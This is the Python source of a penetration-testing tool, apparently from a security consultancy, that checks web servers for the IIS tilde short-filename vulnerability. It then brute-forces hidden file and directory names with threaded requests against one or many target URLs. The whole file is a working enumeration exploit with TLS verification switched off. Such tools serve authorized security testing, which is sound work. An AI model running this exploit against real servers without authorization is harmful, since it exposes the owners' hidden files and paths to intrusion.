#!/usr/bin/python3
"""
    IIS TILDE ENUMERATION TOOL

    Copyright (c) 2020 HACKER Consulting s.r.o.

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

__version__ = "0.0.2"

import argparse
import sys
import signal
import time

from ptlibs import ptmisclib, ptjsonlib
from ptthreads import ptthreads
import requests


class ptiistild:
    METHOD_LIST = ["DELETE", "PUT", "POST", "GET", "PATCH", "TRACE", "DEBUG", "HEAD", "OPTIONS"]
    def __init__(self, args):
        self.use_json = args.json
        self.ptjsonlib = ptjsonlib.ptjsonlib(self.use_json)
        self.json_no = self.ptjsonlib.add_json("ptiistild")
        # ------------------------
        self.proxies = {"http": args.proxy, "https": args.proxy}
        self.timeout = 15 if not args.proxy else None
        self.headers = ptmisclib.get_request_headers(args)
        self.url_list = self._get_urls_from_file(args.file) if args.file else [args.url]
        # ------------------------
        self.threads = args.threads
        self.special = args.special
        self.is_vulnerable = False

    def run(self, args):
        """Main function"""
        for url in self.url_list:
            self.url = url
            if not self.url.endswith("/"):
                self.url += "/"
            self.result = {"files": [], "directories": [], "complete_files": []}
            self.method = self._check_vulnerable()
            if self.method and args.grabbing:
                self._grab_filenames()
                self._print_result()
        ptmisclib.ptprint_(ptmisclib.out_if(self.ptjsonlib.get_all_json(), "", self.use_json))

    def _check_vulnerable(self):
        """Check if site's vulnerable to IIS Tilde Enumeration"""
        ptmisclib.ptprint_(ptmisclib.out_ifnot(f"Testing {self.url}", "TITLE", self.use_json))
        for method in self.METHOD_LIST:
            r_1 = requests.request(method, self.url+"*~1.*/.aspx", proxies=self.proxies, allow_redirects=False, verify=False)
            r_2 = requests.request(method, self.url+"foo*~1.*/.aspx", proxies=self.proxies, allow_redirects=False, verify=False)
            if r_1.status_code != r_2.status_code:
                self.is_vulnerable = True
                self.ok_status_code = r_1.status_code
                ptmisclib.ptprint_(ptmisclib.out_ifnot(f"Different status codes for method {method} [{r_1.status_code}] & [{r_2.status_code}]", "INFO", self.use_json))
                grab_method = method
        ptmisclib.ptprint_(ptmisclib.out_ifnot(f"HTTP Head Server response: {r_1.headers.get('Server', 'None')}", "INFO", self.use_json))
        self.ptjsonlib.add_data(self.json_no, {"Server": r_1.headers.get('Server', None)})
        self.ptjsonlib.set_status(self.json_no, "ok")
        if self.is_vulnerable:
            self.existent_response = r_1.status_code
            self.non_existent_response = r_2.status_code
            self.ptjsonlib.set_vulnerable(self.json_no, "True")
            ptmisclib.ptprint_(ptmisclib.out_ifnot(f"{self.url} is vulnerable to IIS Tilde Enumeration", "VULN", self.use_json))
            return grab_method
        else:
            self.ptjsonlib.set_vulnerable(self.json_no, "False")
            ptmisclib.ptprint_(ptmisclib.out_ifnot(f"{self.url} not vulnerable to IIS Tilde Enumeration", "NOTVULN", self.use_json))

    def _grab_filenames(self):
        """Grabs/Bruteforces all the information"""
        ptmisclib.ptprint_(ptmisclib.out_ifnot("Grabbing information", "INFO", self.use_json))
        self.targets = [char for char in "abcdefghijklmnopqrstuvwxyz0123456789()-_ "]
        self.chars = [char for char in "abcdefghijklmnopqrstuvwxyz0123456789()-_ "]
        if self.special:
            self.chars.extend([char for char in "!#$%&'()@^`{}"])
        ptthreads_ = ptthreads.ptthreads()
        ptthreads_.threads(self.targets, self._grab_thread, self.threads)

    def _grab_thread(self, target):
        """Grabbing used with threads"""
        ptmisclib.ptprint_(ptmisclib.out_ifnot(target, "", self.use_json), end=f"{' '*10}\r")
        if "." in target:
            extension = True
            wildcard = "*"
        else:
            extension = False
            wildcard = "*~1.*"
        if not self._check_filename(target+wildcard+"/.aspx"):
            return
        if not self._check_filename(target+wildcard[1:]+"/.aspx"):
            self._add_targets(target)
            return
        if extension:
            dot_char = target.find(".")
            if len(target[:dot_char]) < 3:
                ptmisclib.ptprint_(ptmisclib.out_ifnot(f"Complete filename without extension found {target}~1", "", self.use_json))
                self._add_targets(target)
            else:
                tilda_char = target.find("~")
                if len(target[dot_char+1:]) < 3:
                    ptmisclib.ptprint_(ptmisclib.out_ifnot(f"File found {target} [{target.replace('~1', '*')}]", "", self.use_json))
                    self.result["files"].append(target)
                elif len(target[:tilda_char+2]) < 8:
                    self.result["complete_files"].append(target)
                    ptmisclib.ptprint_(ptmisclib.out_ifnot(f"File found {target} [{target.replace('~1', '')}*]", "", self.use_json))
                else:
                    ptmisclib.ptprint_(ptmisclib.out_ifnot(f"File found {target} [{target.replace('~1', '*')}]", "", self.use_json))
                    self.result["files"].append(target)
            return
        else:
            if len(target) < 6:
                #print(f"File found without extension: {target}~1")
                self._add_targets(target)
            else:
                if self._check_filename(target+"*~1"+"/.aspx"):
                    ptmisclib.ptprint_(ptmisclib.out_ifnot(f"Directory found {target}~1", "", self.use_json))
                    self.result["directories"].append(target+"~1")
            self._add_targets(target + "~1.")

    def _check_filename(self, filename):
        """Checks if filename exists on url"""
        for _ in range(20):
            try:
                r = requests.request(self.method, self.url+filename)
                break
            except:
                ptmisclib.ptprint_(ptmisclib.out_ifnot(f".", "", self.use_json), end=" ")
                time.sleep(0.5)
                continue
        if r.status_code == self.ok_status_code:
            return True

    def _add_targets(self, target):
        """adds target+char to targets"""
        for char in self.chars:
            self.targets.append(target+char)

    def _print_result(self):
        ptmisclib.ptprint_(ptmisclib.out_ifnot(f"Found directories: {len(self.result['directories'])}", "", self.use_json))
        ptmisclib.ptprint_(ptmisclib.out_ifnot('\n'.join(i for i in self.result["directories"]), "", self.use_json))

        ptmisclib.ptprint_(ptmisclib.out_ifnot(f"Found files: {len(self.result['files'])}", "", self.use_json))
        ptmisclib.ptprint_(ptmisclib.out_ifnot('\n'.join(i for i in self.result["files"]), "", self.use_json))

        ptmisclib.ptprint_(ptmisclib.out_ifnot(f"Found complete files: {len(self.result['complete_files'])}", "", self.use_json))
        ptmisclib.ptprint_(ptmisclib.out_ifnot('\n'.join(i for i in self.result["complete_files"]), "", self.use_json))

    def _get_urls_from_file(self, file):
        """Return list of URls from file"""
        try:
            with open(file, "r") as f:
                domain_list = [line.strip("\n") for line in f]
        except Exception:
            sys.exit("File not found")
        return domain_list


def get_help():
    return [
        {"description": ["IIS Tilde Enumeration Tool"]},
        {"usage": ["ptiistild <options>"]},
        {"usage_example": [
            "ptiisdtild -u https://www.example.com/",
            "ptiisdtild -f domain_list.txt",
        ]},
        {"options": [
            ["-u",  "--url",                    "<url>",            "Connect to URL"],
            ["-f",  "--file",                   "<file>",           "Load urls from file"],
            ["-g",  "--grabbing",               "",                 "Grab/Bruteforce all the info"],
            ["-s",  "--special",                "",                 "Add special characters to charset [!#$%&'()@^`{}]"],
            ["-p",  "--proxy",                  "<proxy>",          "Set proxy (e.g. http://127.0.0.1:8080)"],
            ["-c",  "--cookie",                 "<cookie>",         "Set cookie"],
            ["-t",  "--threads",                "<threads>",        "Set number of threads (default 20)"],
            ["-H",  "--headers",                "<header:value>",   "Set custom header(s)"],
            ["-ua",  "--user-agent",            "<ua>",             "Set User-Agent header"],
            ["-j",  "--json",                   "",                 "Output in JSON format"],
            ["-v",  "--version",                "",                 "Show script version and exit"],
            ["-h",  "--help",                   "",                 "Show this help message and exit"]
        ]
        }]


def parse_args():
    parser = argparse.ArgumentParser(add_help=False, usage=f"{SCRIPTNAME} <options>")
    parser.add_argument("-u", "--url", type=str)
    parser.add_argument("-f", "--file", type=str)
    parser.add_argument("-p", "--proxy", type=str)
    parser.add_argument("-c", "--cookie", type=str)
    parser.add_argument("-t", "--threads", type=int, default=20)
    parser.add_argument("-H", "--headers", type=str, nargs="+")
    parser.add_argument("-ua", "--user-agent", type=str, default="Penterep Tools")
    parser.add_argument("-s", "--special", action="store_true")
    parser.add_argument("-g", "--grabbing", action="store_true")
    parser.add_argument("-j", "--json", action="store_true")
    parser.add_argument("-v", "--version", action="version", version=f"%(prog)s {__version__}")

    if len(sys.argv) == 1 or "-h" in sys.argv or "--help" in sys.argv:
        ptmisclib.help_print(get_help(), SCRIPTNAME, __version__)
        sys.exit(0)
    args = parser.parse_args()
    ptmisclib.print_banner(SCRIPTNAME, __version__, args.json)
    return args


def main():
    global SCRIPTNAME
    SCRIPTNAME = "ptiistild"
    requests.packages.urllib3.disable_warnings()
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'

    args = parse_args()
    script = ptiistild(args)
    script.run(args)


if __name__ == "__main__":
    main()